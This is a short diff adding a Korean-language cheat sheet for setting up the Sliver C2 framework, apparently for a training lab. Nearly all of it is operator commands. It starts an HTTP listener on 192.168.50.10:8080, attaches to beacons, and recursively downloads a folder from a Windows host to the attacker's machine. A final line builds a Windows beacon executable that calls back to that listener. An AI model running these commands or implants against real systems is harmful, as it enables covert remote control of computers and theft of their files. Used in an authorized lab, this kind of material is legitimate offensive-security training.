@@ -1,0 +1,23 @@
+silver c2 설치 하기 (드래그 드롭으로 설치하시면 될 것 같습니다)
+https://github.com/BishopFox/sliver/releases/tag/v1.7.7
+
+sliver-server_linux-amd64
+sliver-server_linux-amd64.minisig
+
+드래그 드롭한 디렉토리 가서
+./sliver-server_linux-amd64
+
+
+http --lhost 192.168.50.10 --lport 8080
+beacons
+use 
+download --recurse "C:/Windows/Temp/Kisec" "/home/kali/C2output"
+tasks
+tasks fetch <task id>
+
+
+
+
+
+(이건 비콘 생성용, 지금은 안해도됨)
+generate beacon --http 'http://192.168.50.10:8080?force-http=true&max-errors=3' --os windows --arch amd64 --format exe --seconds 300 --jitter 0 --skip-symbols --debug --save /home/kali/Tools/sliver/output/SLIVER_LAB_BEACON.exe
